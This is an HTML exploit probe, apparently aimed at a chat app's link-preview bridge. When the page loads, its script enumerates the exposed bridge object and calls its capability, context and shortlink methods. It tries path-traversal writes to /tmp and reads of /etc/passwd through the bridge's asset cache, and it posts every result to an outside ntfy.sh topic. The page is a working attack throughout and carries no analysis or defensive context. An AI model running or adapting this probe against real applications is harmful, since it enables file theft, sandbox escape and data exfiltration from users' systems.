<!doctype html>
<meta charset="utf-8">
<title>r3chat bridge persistence probe</title>
<script>
const TOPIC = "r3chat-yym-31983-redirectbridge1";
const LOG = "https://ntfy.sh/" + TOPIC;

function send(data) {
  try {
    fetch(LOG, {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify(Object.assign({ t: Date.now() }, data))
    });
  } catch (_) {}
}

window.addEventListener("error", (e) => {
  send({ stage: "top-error", err: String(e.error || e.message || e) });
});

(async () => {
  const b = window.rcPartner || window.previewBridge;
  send({
    stage: "start",
    href: location.href,
    referrer: document.referrer,
    hasBridge: !!b,
    keys: b ? Object.keys(b) : [],
    assetKeys: b && b.assetCache ? Object.keys(b.assetCache) : []
  });

  if (!b) return;

  try {
    const caps = await b.capabilities();
    send({ stage: "caps", caps: JSON.stringify(caps).slice(0, 800) });
  } catch (e) {
    send({ stage: "caps-fail", err: String(e) });
  }

  try {
    const ctx = await b.getContext();
    send({ stage: "ctx", ctx: JSON.stringify(ctx).slice(0, 800) });
  } catch (e) {
    send({ stage: "ctx-fail", err: String(e) });
  }

  try {
    const r = await b.resolveShortlink("https://example.com/");
    send({ stage: "short", ret: JSON.stringify(r).slice(0, 800) });
  } catch (e) {
    send({ stage: "short-fail", err: String(e) });
  }

  try {
    await b.assetCache.put("../../../../../../tmp/r3chat-redirect-bridge", "bridge persists\n", "utf8");
    send({ stage: "put-ok" });
  } catch (e) {
    send({ stage: "put-fail", err: String(e) });
  }

  try {
    const p = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
    send({ stage: "read-ok", sample: String(p).slice(0, 200) });
  } catch (e) {
    send({ stage: "read-fail", err: String(e) });
  }
})();
</script>
<body>r3chat bridge persistence probe</body>
